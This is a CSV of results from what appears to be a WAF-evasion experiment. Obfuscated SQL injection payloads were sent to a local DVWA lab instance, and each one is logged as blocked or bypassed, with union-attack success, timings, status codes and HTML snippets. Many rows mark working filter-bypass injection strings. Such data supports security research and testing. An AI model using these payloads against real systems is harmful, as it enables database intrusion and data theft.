Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@!=.1+or+not+{x+(select+1)}=1=+(!+{x,Blocked,No,None,Invalid,0.0187,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or%0b!+{`if`%0b1}=1=%0b(not%0b1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0314,72.3,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0b{`if`%0b1}=1+like%0b{x%0b(select%0b1)}=1--+,Bypassed,No,None,Invalid,0.0291,72.33,No,500,
0'<@!=1+||%0b!%0b{x+(select%0b1)}=1+is%0bfalse%23,Blocked,No,None,Invalid,0.0178,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not+{x+(select+1)}=1=+(!%0b{x,Blocked,No,None,Invalid,0.0264,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or+0=+(not+{`if`%0b1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0281,72.33,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!+{a+1}=1=+(not+{`if`+1}=1,Bypassed,No,None,Invalid,0.0314,72.23,No,500,
0%27<@=1%0bor+not%0b{x+(select+1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+!+{x+(select%0b1)}=1=+(!+{x,Bypassed,No,None,Invalid,0.0252,72.23,No,500,
0'<@!=1%0b||+not%0b{a%0b1}=1=+(not%0b{a+1}=1,Bypassed,No,None,Invalid,0.0489,72.23,No,500,
0%27<@=1+||%0bnot%0b{x+(select%0b1)}=1=+(!%0b{a,Blocked,No,None,Invalid,0.0436,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+not+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0205,72.23,No,500,
0%27<@!=1.+||+not%0b{x+(select+1)}=1=%0b(not+{`if`,Bypassed,Yes,Yes (unionAtk),Invalid,0.0137,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!+{a%0b1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Invalid,0.0263,72.23,No,500,
0'<@!=1%0b||+not%0b{a+1}=1=%0b(!%7efalse),Bypassed,No,None,Invalid,0.0241,72.23,No,500,
0'<@=1+||+false=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0198,72.23,No,500,
0'<@=1+||+not+{a+1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0282,72.23,No,500,
0'or%0b1<@.+||+not+1=+(!%0b{x+,Blocked,No,None,Invalid,0.0162,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!%0b{a+1}=1=+(!%0b1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0299,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot%0b{x+(select%0b1)}=1=+(!+1,Blocked,No,None,Invalid,0.022,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=+(!+{a,Bypassed,Yes,Yes (unionAtk),Invalid,0.0474,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=%0b(not%0b1,Bypassed,No,None,Invalid,0.0346,72.23,No,500,
0%27<@!=.1%0bor%0b!+{x+(select+1)}=1=%0b(not%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0269,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not+true=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0257,72.23,No,500,
0'<@!=.1+or+!%0btrue=%0b(!+{a%0b1}=1),Bypassed,No,None,Invalid,0.0433,72.23,No,500,
0'<@=1+||+!%0b1=+(not+{`if`%0b1}=1),Bypassed,No,None,Invalid,0.0167,72.23,No,500,
0%27<@!=.1%0bor+not+true=+(!+true)+||,Bypassed,Yes,Yes (unionAtk),Invalid,0.0311,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(!%0b{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0442,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+!%0b{x%0b(select%0b1)}=1=+(not%0b{`if`,Bypassed,No,None,Invalid,0.0164,72.23,No,500,
0'<@=.1+||%0bnot+{`if`+1}=1=%0b(not+{a+1}=1,Bypassed,No,None,Invalid,0.0469,72.23,No,500,
0'<@!=.1%0b||%0b!+{`if`+1}=1=+(!%0b{`if`%0b1}=1,Bypassed,No,None,Invalid,0.0222,72.23,No,500,
0%27or%0b@<@.%0bor%0b!%0b{a+1}=1=%0b(!+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0114,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+!+{a+1}=1=+(false)+or,Blocked,No,None,Invalid,0.0294,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||%0b!%0b{`if`%0b1}=1=+(!%0b{x+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0247,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0b{x%0b(select%0b1)}=1%0blike+{x+(select%0b1)}=1%23,Bypassed,No,None,Invalid,0.0233,72.23,No,500,
0'<@!=1.+or%0b!~0=%0b(not%0b{a+1}=1),Bypassed,No,None,Invalid,0.0195,72.23,No,500,
0%27<@=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0231,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0b!+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Invalid,0.0412,72.23,No,500,
0'<@=1.%0b||%0b{`if`+1}=1+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Invalid,0.0433,72.23,No,500,
0%27<@!=.1%0bor+false=+(0)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0469,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0bnot+{a%0b1}=1=%0b(false)%0bor,Bypassed,Yes,Yes (unionAtk),Invalid,0.0235,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!+{x+(select%0b1)}=1=%0b(!%7e,Bypassed,Yes,Yes (unionAtk),Invalid,0.0339,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+not~false=+(not%7e0)%23,Bypassed,No,None,Invalid,0.0201,72.23,No,500,
0'<@!=.1%0bor%0bnot+{a%0b1}=1=%0b(not+{x%0b,Bypassed,No,None,Invalid,0.0297,72.23,No,500,
0%27<@=1.+||+not+{`if`+1}=1=+(not+{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0341,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@%0bor+{x+(select+1)}=1+like%0b{a%0b1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0191,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.%0b||+not+{x%0b(select+1)}=1=%0b(not,Bypassed,Yes,Yes (unionAtk),Invalid,0.0433,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+not+true=%0b(not~false)%0bor,Bypassed,No,None,Invalid,0.0425,72.23,No,500,
0'<@=1+||+not%0b1=%0b(not~0)%0b||,Blocked,No,None,Invalid,0.0204,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(not+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0258,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot+{x+(select+1)}=1=%0b(!%0b{a,Blocked,No,None,Invalid,0.0297,72.25,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+not+{a+1}=1=%0b(not%0b{x+,Bypassed,No,None,Invalid,0.0177,72.33,No,500,
0%27<@!=.1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(!+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0278,72.33,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+not~0=+(not+{x%0b(select+,Bypassed,No,None,Invalid,0.0234,72.33,No,500,
0'<@=1+or+!+{x+(select%0b1)}=1=%0b(!%0b{x,Blocked,No,None,Invalid,0.0213,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b{`if`,Bypassed,No,None,Invalid,0.0515,72.33,No,500,
0%27<@!=1%0bor+not+{x+(select+1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0199,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0b{x%0b(select+1)}=1+like+{`if`+1}=1%0b||%27,Bypassed,No,None,Invalid,0.0318,72.23,No,500,
0'<@!=.1%0b||+!%0b{x+(select+1)}=1=%0b(!+,Bypassed,No,None,Invalid,0.0406,72.23,No,500,
0%27<@!=1.+or+not+{x+(select+1)}=1=%0b(false),Blocked,No,None,Invalid,0.0369,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Invalid,0.0537,72.23,No,500,
0'<@=1.+||%0b{x%0b(select%0b1)}=1+like%0b{`if`+1}=1%0bor%27,Bypassed,No,None,Invalid,0.0192,72.23,No,500,
0%27<@!=1.%0b||+not%0b{`if`%0b1}=1=%0b(not%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0428,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+!%0btrue=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Invalid,0.0323,72.23,No,500,
0%27<@=.1+||%0bnot~0=%0b(not+{a+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0227,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+not%0b{`if`+1}=1=+(!+true),Bypassed,Yes,Yes (unionAtk),Invalid,0.0433,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%0b{x+(select+1)}=1=+(!+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0211,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor+!+{x%0b(select+1)}=1=+(!%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0275,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+!+{`if`+1}=1+is+false+||',Bypassed,No,None,Invalid,0.0338,72.23,No,500,
0%27<@=1.%0bor%0bnot~0=%0b(!%0b{x+(select+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0227,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+{x+(select+1)}=1%0blike+{x%0b(select+1)}=1%0b,Blocked,No,None,Invalid,0.0108,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||+!%0b{`if`+1}=1=%0b(not+{a%0b,Bypassed,No,None,Invalid,0.0123,72.23,No,500,
0%27<@=1+or%0bnot%0b{x%0b(select+1)}=1=%0b(not+{a,Bypassed,Yes,Yes (unionAtk),Invalid,0.0451,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+!%0b{`if`+1}=1=+(!+{`if`%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0261,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
